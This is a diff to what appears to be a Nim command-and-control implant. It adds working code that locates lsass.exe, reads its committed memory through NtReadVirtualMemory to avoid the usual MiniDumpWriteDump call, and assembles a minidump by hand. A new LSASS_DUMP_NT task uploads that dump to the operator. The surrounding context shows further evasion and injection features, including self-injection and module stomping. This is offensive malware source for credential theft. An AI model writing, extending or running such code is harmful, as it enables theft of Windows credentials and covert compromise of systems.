@@ -225,6 +225,145 @@ when defined(windows):
     discard callCloseHandle(ht)
     "[+] self-inject: " & $sc.len & " bytes \xe2\x86\x92 executing"
 
+  # ── LSASS dump via NtReadVirtualMemory (no MiniDumpWriteDump) ───────────────
+  proc lsassDumpNT(lsasPid: DWORD): seq[byte] =
+    var pid = lsasPid
+    if pid == 0:
+      let snap0 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+      if snap0 != INVALID_HANDLE_VALUE:
+        var pe: PROCESSENTRY32W; pe.dwSize = DWORD(sizeof(pe))
+        if Process32FirstW(snap0, addr pe) != 0:
+          while true:
+            if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == "lsass.exe":
+              pid = pe.th32ProcessID; break
+            if Process32NextW(snap0, addr pe) == 0: break
+        discard CloseHandle(snap0)
+    if pid == 0: return @[]
+    let hProc = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, FALSE, pid)
+    if hProc == 0: return @[]
+    defer: discard CloseHandle(hProc)
+    # NtReadVirtualMemory
+    type NtReadVM_t = proc(h: HANDLE; base: PVOID; buf: PVOID; sz: SIZE_T; nr: ptr SIZE_T): LONG {.stdcall.}
+    let ntdll = GetModuleHandleA("ntdll.dll")
+    let ntReadVM = cast[NtReadVM_t](GetProcAddress(ntdll, "NtReadVirtualMemory"))
+    if ntReadVM == nil: return @[]
+    # Enumerate modules
+    type ModInfo = object
+      base: uint64
+      sz: uint32
+      name: string
+    var mods: seq[ModInfo]
+    let snap1 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
+    if snap1 != INVALID_HANDLE_VALUE:
+      var me: MODULEENTRY32; me.dwSize = DWORD(sizeof(me))
+      if Module32First(snap1, addr me) != 0:
+        while true:
+          mods.add(ModInfo(base: cast[uint64](me.modBaseAddr), sz: me.modBaseSize.uint32,
+                           name: $cast[cstring](addr me.szModule[0])))
+          if Module32Next(snap1, addr me) == 0: break
+      discard CloseHandle(snap1)
+    # Enumerate committed memory regions
+    type MemReg = object
+      address: uint64
+      sz: uint64
+      rawBytes: seq[byte]
+    var regs: seq[MemReg]
+    var cur: uint64 = 0
+    while true:
+      var mbi: MEMORY_BASIC_INFORMATION
+      let r = VirtualQueryEx(hProc, cast[LPCVOID](cur), addr mbi, SIZE_T(sizeof(mbi)))
+      if r == 0: break
+      if mbi.State == MEM_COMMIT:
+        var rbuf = newSeq[byte](mbi.RegionSize)
+        var nRead: SIZE_T = 0
+        discard ntReadVM(hProc, mbi.BaseAddress, addr rbuf[0], SIZE_T(mbi.RegionSize), addr nRead)
+        if nRead > 0:
+          regs.add(MemReg(address: cast[uint64](mbi.BaseAddress), sz: nRead.uint64,
+                          rawBytes: rbuf[0..<nRead]))
+      let next = cast[uint64](mbi.BaseAddress) + mbi.RegionSize.uint64
+      if next <= cur: break
+      cur = next
+    # ── Build MDMP ──────────────────────────────────────────────────────────
+    template pu16(off: int; v: uint16) =
+      buf[off]   = uint8(v and 0xFF)
+      buf[off+1] = uint8(v shr 8)
+    template pu32(off: int; v: uint32) =
+      buf[off]   = uint8(v and 0xFF)
+      buf[off+1] = uint8((v shr  8) and 0xFF)
+      buf[off+2] = uint8((v shr 16) and 0xFF)
+      buf[off+3] = uint8(v shr 24)
+    template pu64(off: int; v: uint64) =
+      pu32(off,   uint32(v and 0xFFFFFFFF'u64))
+      pu32(off+4, uint32(v shr 32))
+    const modEntSz  = 108
+    const sysInfoSz = 56
+    const numStr    = 3
+    let dirOff      = 32
+    let sysInfoOff  = dirOff + numStr * 12  # 68
+    let modListOff  = sysInfoOff + sysInfoSz # 124
+    # module name blobs (MINIDUMP_STRING: ULONG32 len + UTF-16 + null)
+    type NameBlob = object
+      rva: int
+      rawBytes: seq[byte]
+    var names: seq[NameBlob]
+    var nameOff = modListOff + 4 + mods.len * modEntSz
+    for m in mods:
+      var blob = newSeq[byte](4 + (m.name.len + 1) * 2)
+      let lenBytes = uint32(m.name.len * 2)
+      blob[0] = uint8(lenBytes and 0xFF); blob[1] = uint8(lenBytes shr 8)
+      for j, c in m.name:
+        blob[4 + j*2] = uint8(ord(c)); blob[4 + j*2 + 1] = 0'u8
+      names.add(NameBlob(rva: nameOff, rawBytes: blob))
+      nameOff += blob.len
+    let mem64Off    = nameOff
+    let mem64HdrLen = 8 + 8 + regs.len * 16
+    let dataOff     = mem64Off + mem64HdrLen
+    var totalData   = 0
+    for r in regs: totalData += r.rawBytes.len
+    var buf = newSeq[byte](dataOff + totalData)
+    # MINIDUMP_HEADER
+    pu32(0,  0x504d444d'u32)
+    pu32(4,  0x0000a793'u32)
+    pu32(8,  numStr.uint32)
+    pu32(12, dirOff.uint32)
+    pu32(16, 0'u32)
+    pu32(20, uint32(epochTime().uint64))
+    pu64(24, 2'u64)
+    # Directories
+    pu32(dirOff,    7'u32); pu32(dirOff+4, sysInfoSz.uint32);  pu32(dirOff+8,  sysInfoOff.uint32)
+    pu32(dirOff+12, 4'u32); pu32(dirOff+16, uint32(mem64Off - modListOff)); pu32(dirOff+20, modListOff.uint32)
+    pu32(dirOff+24, 9'u32); pu32(dirOff+28, mem64HdrLen.uint32); pu32(dirOff+32, mem64Off.uint32)
+    # SystemInfo
+    pu16(sysInfoOff,    9'u16)   # PROCESSOR_ARCHITECTURE_AMD64
+    pu16(sysInfoOff+2,  6'u16)   # ProcessorLevel
+    buf[sysInfoOff+6] = 1'u8     # NumberOfProcessors
+    buf[sysInfoOff+7] = 1'u8     # ProductType
+    pu32(sysInfoOff+8,  10'u32)  # MajorVersion
+    pu32(sysInfoOff+12, 0'u32)   # MinorVersion
+    pu32(sysInfoOff+16, 19041'u32) # BuildNumber
+    pu32(sysInfoOff+20, 2'u32)   # PlatformId
+    # ModuleList
+    pu32(modListOff, mods.len.uint32)
+    for i, m in mods:
+      let e = modListOff + 4 + i * modEntSz
+      pu64(e,    m.base)
+      pu32(e+8,  m.sz)
+      pu32(e+20, names[i].rva.uint32)
+    for nb in names:
+      for j, b in nb.rawBytes: buf[nb.rva + j] = b
+    # Memory64List
+    pu64(mem64Off,   regs.len.uint64)
+    pu64(mem64Off+8, dataOff.uint64)
+    for i, r in regs:
+      let e = mem64Off + 16 + i * 16
+      pu64(e,   r.address)
+      pu64(e+8, r.sz)
+    # Raw data
+    var pos = dataOff
+    for r in regs:
+      for b in r.rawBytes: buf[pos] = b; inc pos
+    return buf
+
   # ── Phantom DLL / module stomping (UDRL) ─────────────────────────────────────
   proc phantomLoad(sc: seq[byte]): string =
     if sc.len == 0: return "[-] phantomLoad: empty shellcode"
@@ -1889,6 +2028,23 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       except: t.sendResult(id, "", "minidump: " & getCurrentExceptionMsg())
     else:
       t.sendResult(id, "", "MINIDUMP: not supported on Linux")
+
+  of "LSASS_DUMP_NT":
+    when defined(windows):
+      try:
+        var lsasPid: DWORD = 0
+        let argTrim = args.strip()
+        if argTrim.len > 0 and argTrim[0] != '{':
+          try: lsasPid = DWORD(parseInt(argTrim)) except: discard
+        let dmpBytes = lsassDumpNT(lsasPid)
+        if dmpBytes.len == 0:
+          t.sendResult(id, "", "lsass_dump_nt: dump failed (need admin?)")
+        else:
+          t.uploadFile(id, "lsass_nt.dmp", dmpBytes)
+          t.sendResult(id, "[+] lsass NT dump: " & $dmpBytes.len & " bytes", "")
+      except: t.sendResult(id, "", "lsass_dump_nt: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "LSASS_DUMP_NT: not supported on Linux")
 
   of "HWBP_CLEAR":
     clearHWBP()
